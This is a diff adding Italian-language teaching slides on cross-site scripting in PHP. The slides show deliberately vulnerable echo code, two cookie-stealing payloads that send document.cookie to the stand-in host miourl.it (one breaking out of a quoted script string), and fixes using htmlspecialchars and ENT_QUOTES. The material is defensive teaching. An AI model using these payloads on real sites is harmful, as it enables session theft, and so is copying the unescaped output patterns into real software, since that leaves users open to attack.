@@ -1,0 +1,81 @@
+# (Bonus #1) Attacchi al client
+Il server non è l'unica possibile vittima di un attaccante, anche i client che utilizzano un servizio possono avere dati sensibili legati a un sito, magari il cookie di sessione.
+
+---
+
+## Esempio
+
+Se potete creare, ad esempio, dei post, ed il backend fa una cosa del genere, cosa può andare storto?
+
+<!-- fragments-start -->
+```php
+<html>
+    <body>
+    <?php
+        $post = get_post_from_db();
+        echo "<h2>" . $post->title . "</h2>";
+        echo "<p>" . $post->body . "</p>";
+    ?>
+    </body>
+</html>
+```
+```html
+<!-- Rubare i cookies, creando un url fittizio e facendoci richieste -->
+<script>fetch("http://miourl.it/?cookies=" + document.cookie)</script> 
+```
+Questo attacco si chiama **XSS**, immaginate se da un post facebook si potesse eseguire del codice javascript!
+
+<!-- fragments-end -->
+
+---
+
+## Proteggersi da XSS
+
+import { IFrame } from '../scripts/IFrame';
+
+<IFrame src="https://www.w3schools.com/html/html_entities.asp" />
+
+
+---
+
+## Proteggersi da XSS con PHP
+
+```php
+<html>
+    <body>
+    <?php
+        $post = get_post_from_db();
+        echo "<h2>" . htmlspecialchars($post->title) . "</h2>";
+        echo "<p>" . htmlspecialchars($post->body) . "</p>";
+    ?>
+    </body>
+</html>
+```
+
+---
+
+## Siamo sicuri che sia tutto ok?
+
+<!-- fragments-start -->
+```php
+<html>
+    <body>
+    <?php
+        $post = get_post_from_db();
+        echo "<h2>" . htmlspecialchars($post->title) . "</h2>";
+        echo "<p>" . htmlspecialchars($post->body) . "</p>";
+        echo "<script>document.title='" . htmlspecialchars($post->title) . "'";
+    ?>
+    </body>
+</html>
+```
+```javascript
+'; fetch('http://miourl.it/?cookies=' + document.cookie);'
+```
+```
+ENT_QUOTES 	Will convert both double and single quotes
+```
+```php
+htmlspecialchars($post->title, ENT_QUOTES)
+```
+<!-- fragments-end -->
